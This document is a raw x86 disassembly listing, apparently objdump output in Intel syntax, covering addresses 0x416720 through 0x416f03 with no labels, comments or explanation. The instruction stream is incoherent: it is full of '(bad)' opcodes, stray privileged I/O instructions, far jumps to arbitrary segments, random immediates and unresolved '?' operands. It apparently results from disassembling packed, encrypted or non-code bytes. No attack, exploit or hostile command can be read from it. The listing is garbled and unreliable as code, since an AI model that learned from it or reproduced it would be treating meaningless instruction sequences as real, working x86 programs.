  416720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416721:	sbb    DWORD PTR [ebx-0xd],esp
  416724:	test   BYTE PTR [edx+0x5eebf237],bl
  41672a:	jns    0x41670d
  41672c:	ss sub al,0x3c
  41672f:	retf   
  416730:	repnz cwde 
  416732:	shl    DWORD PTR [esi-0x3c],cl
  416735:	mov    BYTE PTR [ebp-0x12c3df81],cl
  41673b:	pop    ds
  41673c:	pop    ebp
  41673d:	out    0x11,al
  41673f:	jns    0x416711
  416741:	push   es
  416742:	int3   
  416743:	push   cs
  416744:	xchg   edx,eax
  416745:	test   dh,cl
  416747:	aad    0x8
  416749:	fcomip st,st(1)
  41674b:	rcr    BYTE PTR [esi-0x38],0x5b
  41674f:	icebp  
  416750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416751:	mov    al,ds:0xe53ada64
  416756:	mov    ebp,0x64594ce4
  41675b:	outs   dx,DWORD PTR ds:[esi]
  41675c:	push   ebp
  41675d:	xchg   ebp,eax
  41675e:	or     eax,0x46ec7d8
  416763:	pop    es
  416764:	sub    al,0x3e
  416766:	mov    eax,ds:0x3275bd85
  41676b:	or     dh,BYTE PTR ds:0x6b6d087f
  416771:	aaa    
  416772:	aaa    
  416773:	push   ds
  416774:	jae    0x4167e4
  416776:	cdq    
  416777:	retf   
  416778:	fnsave [eax]
  41677a:	or     BYTE PTR [eax],bl
  41677c:	add    esi,edi
  41677e:	xor    al,0xa3
  416780:	sbb    ebx,ebp
  416782:	clc    
  416783:	ret    
  416784:	push   es
  416785:	inc    ebx
  416786:	(bad)  
  416788:	out    dx,eax
  416789:	xor    edi,edx
  41678b:	xchg   ecx,eax
  41678c:	mov    ah,0x19
  41678e:	xchg   ecx,eax
  41678f:	jg     0x4167fa
  416791:	cmc    
  416792:	sbb    eax,0x9e16fd5f
  416797:	shl    BYTE PTR [eax-0x3b],1
  41679a:	push   WORD PTR [ebp+0x2bc80c9d]
  4167a1:	cwde   
  4167a2:	jne    0x4167d6
  4167a4:	sbb    DWORD PTR [esp+ebx*4],0x94ae425a
  4167ab:	je     0x41678c
  4167ad:	push   DWORD PTR [edx+0x2cbd4138]
  4167b3:	xchg   ecx,eax
  4167b4:	jmp    0x3ca6:0x4ef59eed
  4167bb:	adc    esp,ecx
  4167bd:	push   0x999272de
  4167c2:	sbb    eax,0xc57eab1b
  4167c7:	jns    0x41675a
  4167c9:	jp     0x41674d
  4167cb:	(bad)  
  4167cc:	out    0x4,eax
  4167ce:	popa   
  4167cf:	adc    edx,0x3c13f195
  4167d5:	or     al,0xbe
  4167d7:	or     eax,0xf7876dbc
  4167dc:	sub    BYTE PTR [edx-0x5fe7623f],bl
  4167e2:	xor    dl,BYTE PTR [edi-0x50]
  4167e5:	and    ch,bh
  4167e7:	clc    
  4167e8:	adc    dl,dl
  4167ea:	into   
  4167eb:	arpl   WORD PTR [edi-0x60],ax
  4167ee:	pop    esi
  4167ef:	in     eax,0x19
  4167f1:	mov    DWORD PTR [edi],esp
  4167f3:	or     ebx,0x41819245
  4167f9:	ret    
  4167fa:	xor    BYTE PTR [ebx-0x5f],cl
  4167fd:	sub    BYTE PTR [edi+0x7a],ah
  416800:	push   esp
  416801:	jno    0x416829
  416803:	(bad)  
  416804:	push   esi
  416805:	jp     0x4167c7
  416807:	ret    0xfabb
  41680a:	shr    ebx,1
  41680c:	mov    eax,0x12af2e36
  416811:	ins    BYTE PTR es:[edi],dx
  416812:	ds mov ch,0xaa
  416815:	mov    cl,0x61
  416817:	or     eax,0x96271d70
  41681c:	ins    DWORD PTR es:[edi],dx
  41681d:	or     BYTE PTR [eax+0x19aa8fb2],ah
  416823:	neg    DWORD PTR [esi+0x207cdc5d]
  416829:	pop    edi
  41682a:	sbb    dh,dl
  41682c:	pop    edi
  41682d:	and    esp,edi
  41682f:	out    dx,al
  416830:	push   ebp
  416831:	sub    al,BYTE PTR [ecx]
  416833:	fs sub eax,0x42ace7b2
  416839:	pop    ecx
  41683a:	cld    
  41683b:	mov    ?,edx
  41683d:	cdq    
  41683e:	jo     0x416893
  416840:	test   BYTE PTR [eax+0x42b7cefd],ah
  416846:	adc    bl,BYTE PTR ds:0x9fed3fa9
  41684c:	jp     0x41684c
  41684e:	ficomp DWORD PTR [esi+0x42]
  416851:	clc    
  416852:	daa    
  416853:	adc    DWORD PTR [eax+0x18655158],0xffffff99
  41685a:	jbe    0x416861
  41685c:	mov    ecx,0x4dadaf27
  416861:	or     esp,DWORD PTR [ecx]
  416863:	inc    esp
  416864:	cdq    
  416865:	retf   0x695a
  416868:	or     ebp,DWORD PTR [edx+0x4af4033d]
  41686e:	mov    al,ds:0xfa4a1c3d
  416873:	mov    edi,0x2de85929
  416878:	adc    DWORD PTR [edx-0x5b572d64],ecx
  41687e:	addr16 mov ecx,0x6fae54b7
  416884:	fadd   QWORD PTR [ebp-0x341a34ff]
  41688a:	(bad)  
  41688b:	jns    0x416818
  41688d:	in     al,dx
  41688e:	aaa    
  41688f:	mov    BYTE PTR [edi+0x7910fa53],bl
  416895:	push   ebp
  416896:	push   esp
  416897:	adc    BYTE PTR [edx-0x7a],0x73
  41689b:	mov    ch,0xbc
  41689d:	loopne 0x41684b
  41689f:	cmp    BYTE PTR [edi+0x505c953e],ch
  4168a5:	fist   DWORD PTR [eax]
  4168a7:	mov    bl,0x8c
  4168a9:	mov    ah,0xc5
  4168ab:	mul    DWORD PTR [edx+esi*2+0x29d90607]
  4168b2:	in     eax,0x37
  4168b4:	fst    QWORD PTR [ebx+0xe]
  4168b7:	popa   
  4168b8:	sbb    al,0x38
  4168ba:	and    ebx,DWORD PTR [ebp+0x4ffdf2a2]
  4168c0:	pop    es
  4168c1:	retf   
  4168c2:	(bad)  
  4168c3:	push   edi
  4168c4:	fwait
  4168c5:	inc    edx
  4168c6:	and    DWORD PTR [edx+0x27e9567],0xe
  4168cd:	pop    ecx
  4168ce:	enter  0xde6d,0xe5
  4168d2:	fwait
  4168d3:	jno    0x416917
  4168d5:	cmp    dh,BYTE PTR fs:[edi+0x37]
  4168d9:	mov    eax,0xb5bba34c
  4168de:	and    eax,0x94899560
  4168e3:	and    DWORD PTR [eax],eax
  4168e5:	test   DWORD PTR [eax],edx
  4168e7:	pop    eax
  4168e8:	inc    eax
  4168e9:	pop    edi
  4168ea:	scas   al,BYTE PTR es:[edi]
  4168eb:	cwde   
  4168ec:	jae    0x4168d4
  4168ee:	shr    DWORD PTR [esi],cl
  4168f0:	jmp    0xa0045220
  4168f5:	sbb    eax,0x1cdd9a4b
  4168fa:	(bad)  
  4168fc:	push   es
  4168fd:	fdiv   DWORD PTR [ebx]
  4168ff:	out    0x9c,eax
  416901:	nop
  416902:	push   esp
  416903:	sub    DWORD PTR [edi+esi*4+0x64],eax
  416907:	inc    esp
  416908:	sbb    DWORD PTR [edx],ebx
  41690a:	mov    DWORD PTR [esi+ebp*2],edi
  41690d:	test   BYTE PTR [esi-0x22],bl
  416910:	push   ds
  416911:	and    DWORD PTR [edi-0x64],0x1a
  416915:	or     dl,dl
  416917:	test   DWORD PTR [esi-0x65],esi
  41691a:	jbe    0x416966
  41691c:	fwait
  41691d:	pusha  
  41691e:	sub    eax,0x5bace7a3
  416923:	sub    esp,DWORD PTR [eax-0x32487ae3]
  416929:	lock in eax,0xa
  41692c:	dec    eax
  41692d:	jl     0x4168b7
  41692f:	popf   
  416930:	sbb    edi,DWORD PTR [edi]
  416932:	push   es
  416933:	push   0xbba8693d
  416938:	scas   eax,DWORD PTR es:[edi]
  416939:	mov    cl,0xe1
  41693b:	xor    eax,0x98a8921e
  416940:	pushf  
  416941:	sti    
  416942:	dec    esp
  416943:	das    
  416944:	fisub  WORD PTR [ecx+esi*2]
  416947:	mov    ebx,0x457a8de3
  41694c:	jns    0x4169af
  41694e:	and    DWORD PTR [ebp+0x4c5695c8],edi
  416954:	jne    0x416915
  416956:	lock aam 0xe7
  416959:	retf   0x7ced
  41695c:	jae    0x4169c0
  41695e:	outs   dx,BYTE PTR ds:[esi]
  41695f:	(bad)  
  416960:	sub    eax,0x88bde11
  416965:	neg    cl
  416967:	xchg   edi,eax
  416969:	retf   0xcc52
  41696c:	jae    0x416998
  41696e:	push   cs
  41696f:	ja     0x416966
  416971:	lods   al,BYTE PTR ds:[esi]
  416972:	or     eax,edi
  416974:	push   es
  416975:	and    ecx,DWORD PTR [esi]
  416977:	call   0xc96b2dc7
  41697c:	test   al,0x40
  41697e:	neg    cl
  416980:	idiv   bl
  416982:	in     eax,0x75
  416984:	inc    edx
  416985:	push   edx
  416986:	mov    ecx,0x27dd42e3
  41698b:	xor    DWORD PTR [esi+0x17ed4409],0x36
  416992:	(bad)  
  416993:	aas    
  416994:	xor    ecx,DWORD PTR [ebx-0x6bb87f33]
  41699a:	aas    
  41699b:	adc    eax,DWORD PTR [ebx]
  41699d:	retf   0x319c
  4169a0:	bound  ebp,QWORD PTR [ebx+edx*4]
  4169a3:	xchg   ebx,eax
  4169a4:	dec    esp
  4169a5:	mov    dh,0xcb
  4169a7:	pushf  
  4169a8:	test   eax,0x394954de
  4169ad:	mov    cl,0x2f
  4169af:	jbe    0x416980
  4169b1:	lods   eax,DWORD PTR ds:[esi]
  4169b2:	cmp    ebx,DWORD PTR [edi]
  4169b4:	or     eax,esi
  4169b6:	dec    esi
  4169b7:	je     0x416a0f
  4169b9:	mov    ecx,0xe3619d75
  4169be:	xlat   BYTE PTR ds:[ebx]
  4169bf:	and    DWORD PTR [ebp+edx*4+0x63],0x30
  4169c4:	and    DWORD PTR [edx],0x7f155cc9
  4169ca:	(bad)  
  4169cb:	fsub   DWORD PTR [esi-0x20]
  4169ce:	sub    dl,BYTE PTR [ebx-0x5c]
  4169d1:	or     eax,0xdd4db28
  4169d6:	xchg   ecx,eax
  4169d7:	xlat   BYTE PTR ds:[ebx]
  4169d8:	push   ecx
  4169d9:	push   es
  4169da:	pop    ebp
  4169db:	in     al,dx
  4169dc:	or     ecx,esp
  4169de:	dec    edi
  4169df:	xchg   esi,eax
  4169e0:	adc    ebx,DWORD PTR [esi-0x59e0f306]
  4169e6:	mov    DWORD PTR [ebx-0x37],esi
  4169e9:	call   0x11b29dee
  4169ee:	imul   esi,esp,0xffffffbc
  4169f1:	push   ebp
  4169f2:	xor    bh,BYTE PTR [edx]
  4169f4:	xchg   al,cl
  4169f6:	aaa    
  4169f7:	sbb    ecx,DWORD PTR [edi+0x3940e05f]
  4169fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169fe:	mov    ebx,DWORD PTR [ebp+0x7a124405]
  416a04:	sahf   
  416a05:	push   0xffffff97
  416a07:	cmp    ch,BYTE PTR [edx+0x7515ad36]
  416a0d:	xchg   esp,eax
  416a0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a0f:	mov    ebx,0x759c30b2
  416a14:	cmp    eax,0xbcc15f66
  416a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a1a:	ja     0x416a50
  416a1c:	lahf   
  416a1d:	fistp  WORD PTR [edi+edx*1]
  416a20:	jne    0x416a4c
  416a22:	add    BYTE PTR [eax-0x7b6465ab],cl
  416a28:	(bad)  
  416a29:	mov    bl,0x3b
  416a2b:	mov    bl,0xb8
  416a2d:	inc    ebx
  416a2e:	sub    edi,DWORD PTR [edx-0x53a1cc9e]
  416a34:	add    bh,BYTE PTR [eax]
  416a36:	aaa    
  416a37:	gs mov esi,0xeda0d519
  416a3d:	inc    edi
  416a3e:	mov    ebx,0xb3b16ee3
  416a43:	lahf   
  416a44:	pushf  
  416a45:	aaa    
  416a46:	mov    al,BYTE PTR [ecx+0x2b]
  416a49:	pushf  
  416a4a:	loopne 0x416ac8
  416a4c:	sti    
  416a4d:	call   DWORD PTR [ecx-0x22a80317]
  416a53:	ret    
  416a54:	cwde   
  416a55:	or     al,0x8f
  416a57:	lea    edi,[ecx+0x1b898369]
  416a5d:	sub    BYTE PTR [ebp-0xe1dea9a],ah
  416a63:	std    
  416a64:	push   cs
  416a65:	mov    eax,DWORD PTR [ebx]
  416a67:	add    ebp,DWORD PTR [ebx+0x64bdca97]
  416a6d:	lds    edx,FWORD PTR [edi+ecx*4+0x31d22f85]
  416a74:	jp     0x416ace
  416a76:	loope  0x416a38
  416a78:	add    dl,0x37
  416a7b:	inc    ecx
  416a7c:	icebp  
  416a7d:	mov    ds:0x2d5a6f25,al
  416a82:	stos   DWORD PTR es:[edi],eax
  416a83:	hlt    
  416a84:	mul    BYTE PTR [ebx]
  416a86:	or     ebp,DWORD PTR [esi]
  416a88:	jecxz  0x416a5c
  416a8a:	into   
  416a8b:	popf   
  416a8c:	cmp    DWORD PTR [ebx+0x445f6f0d],esp
  416a92:	repz and bl,dh
  416a95:	add    eax,0xf7c60b0
  416a9a:	fsub   DWORD PTR [eax-0x346c9983]
  416aa0:	test   DWORD PTR [ebp-0xcd85920],ecx
  416aa6:	fstp   QWORD PTR [ebp-0x49]
  416aa9:	rcr    DWORD PTR [edi+ecx*2-0x22a186d5],0xb2
  416ab1:	dec    ebx
  416ab2:	jg     0x416b15
  416ab4:	lahf   
  416ab5:	xor    dl,BYTE PTR [esi+0x3e45faf9]
  416abb:	cmp    al,al
  416abd:	popa   
  416abe:	idiv   DWORD PTR [esi+0x3]
  416ac1:	mov    ah,ah
  416ac3:	xchg   DWORD PTR [edx],eax
  416ac5:	pusha  
  416ac6:	inc    ebp
  416ac7:	lds    ebp,FWORD PTR [edx+eiz*4]
  416aca:	xor    al,0xd3
  416acc:	mov    ebx,DWORD PTR [ebp-0x23]
  416acf:	test   eax,0x636f0558
  416ad4:	jmp    0x416b25
  416ad6:	jmp    0xf8b0:0x73a7cd5e
  416add:	clc    
  416ade:	push   ebx
  416adf:	test   DWORD PTR [edi],edx
  416ae1:	push   ebx
  416ae2:	out    dx,al
  416ae3:	dec    eax
  416ae4:	cmp    edx,DWORD PTR [ebx]
  416ae6:	(bad)  
  416ae7:	or     eax,0x84f2d72a
  416aec:	dec    ebp
  416aed:	add    DWORD PTR [eax+0x5b6c8eca],esp
  416af3:	mov    ss,WORD PTR [ecx]
  416af5:	jmp    0x9393:0x345b6586
  416afc:	mov    al,ds:0x94f907be
  416b01:	retf   
  416b02:	xor    DWORD PTR [esi-0x1ef99f5a],esp
  416b08:	and    ebx,edx
  416b0a:	fsub   QWORD PTR [ebx+0x3c29cbb8]
  416b10:	(bad)  
  416b11:	jmp    0x416b3d
  416b13:	jmp    0x416b48
  416b15:	mov    eax,0xdfd57dcf
  416b1a:	out    dx,al
  416b1b:	aaa    
  416b1c:	out    0xa5,eax
  416b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b1f:	test   eax,0x170f90db
  416b24:	push   ebp
  416b25:	aaa    
  416b26:	push   esi
  416b27:	aas    
  416b28:	icebp  
  416b29:	loopne 0x416b21
  416b2b:	cdq    
  416b2c:	pop    eax
  416b2d:	cdq    
  416b2e:	imul   esi,DWORD PTR [eax-0xd9a076f],0x12a9bed1
  416b38:	xchg   ebx,eax
  416b39:	push   edi
  416b3a:	jge    0x416acf
  416b3c:	cmc    
  416b3d:	leave  
  416b3e:	push   di
  416b40:	xor    ebp,DWORD PTR [ebx+eiz*8-0x1730b2f8]
  416b47:	jne    0x416afe
  416b49:	jecxz  0x416ae4
  416b4b:	dec    ebx
  416b4c:	and    DWORD PTR [ecx],ecx
  416b4e:	das    
  416b4f:	mov    eax,0xfbe0f499
  416b54:	mov    ecx,0x612fda66
  416b59:	dec    ebx
  416b5a:	push   eax
  416b5b:	xchg   ecx,eax
  416b5c:	mov    dl,0x76
  416b5e:	pop    edx
  416b5f:	stos   DWORD PTR es:[edi],eax
  416b60:	and    BYTE PTR [ebp+0x79],bl
  416b63:	pop    edi
  416b64:	pop    esp
  416b65:	fst    QWORD PTR [edi]
  416b67:	scas   al,BYTE PTR es:[edi]
  416b68:	adc    BYTE PTR [eax],ah
  416b6a:	xchg   edi,eax
  416b6b:	lea    edx,ds:0x3c21aa52
  416b71:	sbb    eax,0x1586e18f
  416b76:	mov    ch,0xd7
  416b78:	das    
  416b79:	fwait
  416b7a:	add    DWORD PTR [ebx-0x12047681],ebx
  416b80:	jns    0x416b12
  416b82:	vpmaxub xmm6,xmm6,XMMWORD PTR [edx+0x42e9e5b6]
  416b8a:	stos   BYTE PTR es:[edi],al
  416b8b:	xor    ch,BYTE PTR [edi+0xe]
  416b8e:	adc    edx,DWORD PTR [ecx+0x3ad968c0]
  416b94:	aam    0xff
  416b96:	das    
  416b97:	and    al,0x44
  416b99:	retf   
  416b9a:	jns    0x416bb2
  416b9c:	inc    esi
  416b9d:	pop    ebp
  416b9e:	add    eax,ebx
  416ba0:	cmp    eax,0xc9314d84
  416ba5:	imul   BYTE PTR [ebx-0x4]
  416ba8:	adc    DWORD PTR [eax-0x2],0xd98a27d2
  416baf:	in     al,0x97
  416bb1:	adc    al,0xcf
  416bb3:	cmp    al,0x59
  416bb5:	retf   0x697d
  416bb8:	stos   DWORD PTR es:[edi],eax
  416bb9:	ds xchg esp,eax
  416bbb:	mov    WORD PTR [ebx+0x1290dbfa],gs
  416bc1:	je     0x416c2d
  416bc3:	jl     0x416b65
  416bc5:	fidiv  DWORD PTR [ecx+0x3f]
  416bc8:	(bad)  
  416bc9:	imul   ebp,DWORD PTR [edi+0x123ce27c],0xffffff9f
  416bd0:	in     al,dx
  416bd1:	fcom   DWORD PTR [ebx]
  416bd3:	push   0x80f8ad
  416bd8:	icebp  
  416bd9:	dec    esi
  416bda:	test   DWORD PTR [ebp+0x78],esi
  416bdd:	xor    BYTE PTR [esi-0x27ee50a3],dl
  416be3:	jge    0x416c3a
  416be5:	mov    bh,BYTE PTR [edx]
  416be7:	stc    
  416be8:	ds push 0xcd85519
  416bee:	aam    0xe1
  416bf0:	popf   
  416bf1:	pop    ebp
  416bf2:	mov    ds:0x80e25cb0,eax
  416bf7:	adc    dl,dl
  416bf9:	mov    edx,0xb4c19030
  416bfe:	sbb    eax,0x929dc9f5
  416c03:	ins    DWORD PTR es:[edi],dx
  416c04:	push   ebx
  416c05:	or     al,0xbe
  416c07:	sbb    bh,cl
  416c09:	imul   esp,DWORD PTR [ebx-0x4],0xffffffc8
  416c0d:	cli    
  416c0e:	loope  0x416c53
  416c10:	enter  0x16a8,0x99
  416c14:	jb     0x416c7c
  416c16:	push   ecx
  416c17:	arpl   bp,si
  416c19:	imul   ebp,DWORD PTR [esp+ebp*2],0x47
  416c1d:	add    eax,0x8831baf6
  416c22:	std    
  416c23:	in     eax,dx
  416c24:	jle    0x416c32
  416c26:	(bad)  
  416c27:	popa   
  416c28:	ds cwde 
  416c2a:	mov    edx,0xdbd0c1ca
  416c2f:	dec    edi
  416c30:	pop    ecx
  416c31:	call   0x7200:0x64436fcf
  416c38:	or     bh,BYTE PTR [esi]
  416c3a:	rol    DWORD PTR [eax+0x4],0x72
  416c3e:	xor    esp,ecx
  416c40:	lods   eax,DWORD PTR ds:[esi]
  416c41:	lea    ecx,[bp+si]
  416c44:	(bad)  
  416c45:	shl    BYTE PTR [ebx-0x23],1
  416c48:	sub    al,0x68
  416c4a:	push   0xb887b390
  416c4f:	repnz and BYTE PTR [ebx+0x2d],bl
  416c53:	cld    
  416c54:	mov    bh,0xe9
  416c56:	adc    dl,cl
  416c58:	mov    ah,0x9
  416c5a:	cli    
  416c5b:	sbb    DWORD PTR [ecx+esi*2],esi
  416c5e:	pop    ecx
  416c5f:	nop
  416c60:	fstp   QWORD PTR [ebx+0x21]
  416c63:	ss jle 0x416c0b
  416c66:	pop    eax
  416c67:	push   ss
  416c68:	pop    ss
  416c69:	stos   BYTE PTR es:[edi],al
  416c6a:	je     0x416c51
  416c6c:	xor    al,BYTE PTR [ebp-0x20a9e8b0]
  416c72:	push   esp
  416c73:	mov    WORD PTR [eax],fs
  416c75:	fld    st(5)
  416c77:	add    DWORD PTR [esi],ebx
  416c79:	lahf   
  416c7a:	rcr    DWORD PTR [ebp-0x1f],cl
  416c7d:	push   edi
  416c7e:	xchg   edi,eax
  416c7f:	dec    ecx
  416c80:	rol    ch,0x34
  416c83:	(bad)  
  416c84:	xchg   DWORD PTR [eax-0x62],ebx
  416c87:	sbb    al,0x85
  416c89:	idiv   dl
  416c8b:	mov    ds:0x73f256d7,al
  416c90:	adc    al,0xc9
  416c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c93:	jg     0x416c82
  416c95:	dec    edi
  416c96:	es pop ebp
  416c98:	popf   
  416c99:	push   ecx
  416c9a:	sub    al,0x90
  416c9c:	jne    0x416ca4
  416c9e:	imul   edi,ebp,0xffffffe4
  416ca1:	dec    eax
  416ca2:	mov    ah,0x23
  416ca5:	std    
  416ca6:	cmp    al,BYTE PTR [eax-0x2b76b931]
  416cac:	inc    ebp
  416cad:	xchg   edi,eax
  416cae:	jecxz  0x416c98
  416cb0:	xor    al,0xa3
  416cb2:	pop    ss
  416cb3:	fsubr  DWORD PTR [ebx-0x172e6f22]
  416cb9:	retf   0x2a2a
  416cbc:	pop    esi
  416cbd:	clc    
  416cbe:	xchg   ebx,eax
  416cbf:	mov    esi,DWORD PTR ds:0xda17a5ce
  416cc5:	enter  0x98,0xb1
  416cc9:	(bad)  [edi]
  416ccb:	aas    
  416ccc:	jo     0x416cc0
  416cce:	jbe    0x416caf
  416cd0:	cmp    eax,0xfd3e5aac
  416cd5:	(bad)  
  416cd6:	call   0x26ba:0x76b6096c
  416cdd:	mov    dh,0x87
  416cdf:	pop    ecx
  416ce0:	xchg   DWORD PTR [ebx+0x3b8685ed],ecx
  416ce6:	cmp    bh,BYTE PTR [esp+ecx*2]
  416ce9:	outs   dx,DWORD PTR ds:[esi]
  416cea:	outs   dx,DWORD PTR ds:[esi]
  416ceb:	popa   
  416cec:	call   DWORD PTR [esi]
  416cee:	or     BYTE PTR [esi-0x30b6183],0x54
  416cf5:	dec    edx
  416cf6:	scas   al,BYTE PTR es:[edi]
  416cf7:	dec    ebx
  416cf8:	in     al,dx
  416cf9:	sbb    cl,BYTE PTR [ebx+0x1bc82044]
  416cff:	push   esp
  416d00:	jnp    0x416d6d
  416d02:	push   ss
  416d03:	ret    0xde15
  416d06:	and    BYTE PTR [esi],ah
  416d08:	mov    BYTE PTR [esi],ch
  416d0a:	(bad)  
  416d0b:	add    al,0x5d
  416d0d:	outs   dx,BYTE PTR ds:[esi]
  416d0e:	sub    DWORD PTR [edx+edx*8-0x24fe4150],eax
  416d15:	push   esp
  416d16:	pop    edi
  416d17:	dec    ebp
  416d18:	jmp    0xdaf0f654
  416d1d:	rcl    DWORD PTR [edx-0x4e],cl
  416d20:	out    0xab,eax
  416d22:	ss cmp ebx,esp
  416d25:	fwait
  416d26:	push   ecx
  416d27:	xchg   DWORD PTR [eax+edi*8-0x71bef2c1],edi
  416d2e:	adc    bl,BYTE PTR [ebx]
  416d30:	inc    eax
  416d31:	out    0x32,al
  416d33:	outs   dx,DWORD PTR ds:[esi]
  416d34:	mov    edx,0x28585ce7
  416d39:	xchg   DWORD PTR ds:0xbd727ab,edi
  416d3f:	leave  
  416d40:	inc    ebp
  416d41:	mov    ?,WORD PTR [eax-0x6a9ec5b5]
  416d47:	cmp    al,0x69
  416d49:	mov    BYTE PTR [edx-0x1b],cl
  416d4c:	shr    esp,cl
  416d4e:	arpl   WORD PTR [esi],cx
  416d50:	adc    DWORD PTR [ebp-0x7b288088],eax
  416d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d57:	push   edi
  416d58:	push   0x3a
  416d5a:	(bad)
  416d5e:	test   al,0x9e
  416d60:	push   ss
  416d61:	pop    ds
  416d62:	push   ss
  416d63:	mov    al,0xf1
  416d65:	cmp    dh,BYTE PTR [edx-0x29]
  416d68:	mov    ebp,0x688b56
  416d6d:	lods   eax,DWORD PTR ds:[esi]
  416d6e:	push   ss
  416d6f:	and    eax,0x253edd92
  416d74:	in     eax,dx
  416d75:	sub    dl,BYTE PTR [edx+0x64ba5267]
  416d7b:	xor    BYTE PTR [esi],ah
  416d7d:	adc    dl,ch
  416d7f:	lods   eax,DWORD PTR ds:[esi]
  416d80:	and    DWORD PTR [eax+0x1228ddfd],ebp
  416d86:	cmp    al,0xe0
  416d88:	or     al,0xdc
  416d8a:	gs mov ebx,0x9eba7d2f
  416d90:	inc    ebx
  416d91:	fild   WORD PTR [ecx+0x1ef512a4]
  416d97:	neg    DWORD PTR [ecx+0x5c0f4814]
  416d9d:	frstor [edi]
  416d9f:	pop    eax
  416da0:	aas    
  416da1:	mov    WORD PTR [ebx+0x0],?
  416da4:	mov    bl,0x30
  416da6:	(bad)  
  416da7:	mov    ah,0xcf
  416da9:	into   
  416daa:	mov    ch,0x4d
  416dac:	test   eax,0x4924ed6b
  416db1:	dec    esi
  416db2:	test   al,0x16
  416db4:	inc    esp
  416db5:	rol    BYTE PTR [ebp+0x502cd850],cl
  416dbb:	int3   
  416dbc:	pop    ds
  416dbd:	rcl    al,0x4f
  416dc0:	and    bh,dl
  416dc2:	imul   edi,ecx,0xe43d18ec
  416dc8:	pushf  
  416dc9:	push   ecx
  416dca:	clc    
  416dcb:	inc    esp
  416dcc:	ret    
  416dcd:	or     esi,DWORD PTR [ecx+ecx*8+0x2470bcc8]
  416dd4:	and    dh,cl
  416dd6:	mov    ebx,0xf61679fc
  416ddb:	in     al,dx
  416ddc:	in     eax,dx
  416ddd:	xchg   esi,eax
  416dde:	int3   
  416ddf:	inc    eax
  416de0:	(bad)  
  416de1:	cmp    bh,ah
  416de3:	pop    ds
  416de4:	inc    ebx
  416de5:	popa   
  416de6:	in     al,dx
  416de7:	(bad)  
  416de8:	sub    dl,BYTE PTR [edi-0x62]
  416deb:	xor    DWORD PTR ds:0x5df4caae,ebp
  416df1:	ja     0x416d9c
  416df3:	sub    dh,BYTE PTR [ebx-0x76]
  416df6:	adc    dl,BYTE PTR [ebp-0x3be5a4bb]
  416dfc:	pop    ds
  416dfd:	dec    ebx
  416dfe:	fisubr DWORD PTR [eax-0x64]
  416e01:	fwait
  416e02:	sub    DWORD PTR [ecx],edi
  416e04:	fwait
  416e05:	dec    edi
  416e06:	ret    
  416e07:	fs out 0xa5,eax
  416e0a:	lea    ecx,[eax-0x7875640e]
  416e10:	aam    0x18
  416e12:	cld    
  416e13:	rcr    DWORD PTR [ebx-0x171594af],0x9c
  416e1a:	imul   DWORD PTR [edi-0x48d6b9f1]
  416e20:	cwde   
  416e21:	push   cs
  416e22:	pop    eax
  416e23:	mov    bl,0x2d
  416e25:	test   BYTE PTR [ebx+0x7b],0x25
  416e29:	in     al,dx
  416e2a:	mov    eax,0x1d2876c1
  416e2f:	jg     0x416deb
  416e31:	dec    ecx
  416e32:	stos   BYTE PTR es:[edi],al
  416e33:	mov    edi,0xaf5d55ca
  416e38:	xor    BYTE PTR [esi],ah
  416e3a:	jmp    0xd3e1f28c
  416e3f:	fs mov ecx,0x7a2fe55a
  416e45:	mov    gs,WORD PTR [ecx-0x5d]
  416e48:	dec    ebp
  416e49:	push   esi
  416e4a:	pop    esp
  416e4b:	xor    BYTE PTR [ebx+0x3db4986d],0xae
  416e52:	imul   ebp,DWORD PTR [ecx],0xffffff8c
  416e55:	cwde   
  416e56:	and    BYTE PTR [ebx],bl
  416e58:	add    edi,DWORD PTR [edi-0x3]
  416e5b:	pop    es
  416e5c:	popf   
  416e5d:	or     eax,0xf7a1ef7f
  416e62:	xchg   edi,eax
  416e63:	xchg   edi,eax
  416e64:	and    eax,0x31dc4e1f
  416e69:	mov    ah,0xe8
  416e6b:	cwde   
  416e6c:	mov    ah,0x38
  416e6e:	test   al,0xca
  416e70:	mov    ds:0x5c6f3a67,al
  416e75:	data16 aas 
  416e77:	fst    st(0)
  416e79:	and    al,0x2c
  416e7b:	call   0xdffa4f79
  416e80:	jmp    0x24c0:0x488619f8
  416e87:	and    DWORD PTR [esi],edx
  416e89:	inc    esi
  416e8a:	mov    dl,0x88
  416e8c:	xchg   ebp,eax
  416e8d:	dec    esi
  416e8e:	mov    eax,0x71b6390e
  416e93:	push   esi
  416e94:	add    ecx,0xfffffff1
  416e97:	sbb    DWORD PTR [eax-0xffb22ec],0xffffff80
  416e9e:	jecxz  0x416e7f
  416ea0:	ret    0xd427
  416ea3:	jmp    0x416edb
  416ea5:	(bad)  [eax]
  416ea7:	adc    al,0x56
  416ea9:	pop    esi
  416eaa:	mov    BYTE PTR [ebx-0x18],bl
  416ead:	iretw  
  416eaf:	loopne 0x416ed5
  416eb1:	psubq  mm4,QWORD PTR [eax+0x2a7ae59b]
  416eb8:	dec    esi
  416eb9:	cmp    BYTE PTR [edi+0x71876700],al
  416ebf:	nop
  416ec0:	pop    edi
  416ec1:	pop    ebx
  416ec2:	btc    DWORD PTR [edi+0x3a],0x41
  416ec7:	cmp    eax,0x5ce9664f
  416ecc:	fst    QWORD PTR [edx+0x38d1bbfb]
  416ed2:	call   0xae2434d9
  416ed7:	jae    0x416f3c
  416ed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eda:	lock (bad) 
  416edc:	cmp    DWORD PTR [edx+edx*2-0x61],ebp
  416ee0:	std    
  416ee1:	push   ecx
  416ee2:	idiv   DWORD PTR [esi+0x22]
  416ee5:	imul   edx,DWORD PTR [esi-0x343e9c76],0x1c
  416eec:	xchg   DWORD PTR [ebp+0x2ce1ec2f],ecx
  416ef2:	mov    ds:0xc41ac334,eax
  416ef7:	out    0xc9,eax
  416ef9:	pop    edi
  416efa:	or     esp,ebp
  416efc:	mov    eax,0x601e9a5a
  416f01:	into   
  416f02:	push   esi
  416f03:	imul   edi,DWORD PTR [ebx],0x6e370f1c
